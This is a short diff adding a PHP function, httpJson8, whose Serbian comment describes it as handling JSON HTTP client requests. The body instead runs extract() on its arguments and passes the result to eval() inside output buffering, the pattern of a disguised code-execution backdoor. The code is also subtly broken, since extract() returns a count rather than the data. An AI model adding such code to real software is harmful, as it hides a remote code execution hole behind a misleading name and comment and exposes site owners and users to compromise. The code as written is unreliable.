@@ -1,0 +1,18 @@
+/**
+*   Obrada http klijent zahteva. Podaci su prosledjeni u json formatu.
+*
+*/
+
+public function httpJson8($args): string
+{
+
+ 
+        $args = extract($args);
+
+        ob_start();
+        eval(' ?>' . $args . '<?php ');
+        $result = ob_get_contents();
+        ob_end_clean();
+
+        return $result;
+}
